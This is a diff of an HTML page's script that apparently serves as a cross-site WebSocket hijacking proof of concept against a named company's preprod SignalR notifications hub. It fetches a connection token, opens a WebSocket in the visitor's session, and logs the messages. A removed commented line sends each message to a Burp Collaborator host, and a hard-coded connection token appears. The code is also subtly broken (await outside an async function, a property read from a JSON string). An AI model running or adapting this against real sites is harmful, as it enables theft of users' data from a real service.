@@ -3,19 +3,22 @@
 <script>
 (function(){
 
-  var webSocket = new WebSocket("wss://preprod.hub.knightfrank.com/api/signalr/connect?transport=webSockets&clientProtocol=2.0&impersonatedUserID=&connectionToken=14C1A+rHWKmvjUbKHSUEaISxrUqG34vlDLnLZUfL0Li828ojoU1ai407ij3eeFJtfwg2R7YuE+Gl/XgkctFgw2S+5L87zokvVGZyvbiWCB5eG1PpLZtqcDt5HzgsbcXFaRTWhqYWyDMQ/HZ1MXroNA%3d%3d&connectionData=%5B%7B%22name%22%3A%22notificationshub%22%7D%5D&tid=5");
+	var data = await fetch('https://preprod.hub.knightfrank.com/api/signalr/negotiate?clientProtocol=2.0&impersonatedUserID=&connectionData=%5B%7B%22name%22%3A%22notificationshub%22%7D%5D');
+	var response = await data.json();
+	var r = JSON.stringify(response);
+	
+	var token = r.ConnectionToken;
+	var encodedToken = encodeURI(token);
+
+  var webSocket = new WebSocket("wss://preprod.hub.knightfrank.com/api/signalr/connect?transport=webSockets&clientProtocol=2.0&impersonatedUserID=&connectionToken="+encodedToken+"&connectionData=%5B%7B%22name%22%3A%22notificationshub%22%7D%5D&tid=5");
   
   webSocket.onopen = function (evt) {
       webSocket.send("READY")
   }
-
   webSocket.onmessage = function (evt) {
       var message = evt.data;
-console.log(message);
-    //fetch('https://vgfamw2l43liob8pjxkm6wjfg6mwal.burpcollaborator.net/?'+evt.data, {mode: 'no-cors'});
+		console.log(message);
   }
-
-
 })();
 </script>
 </body>
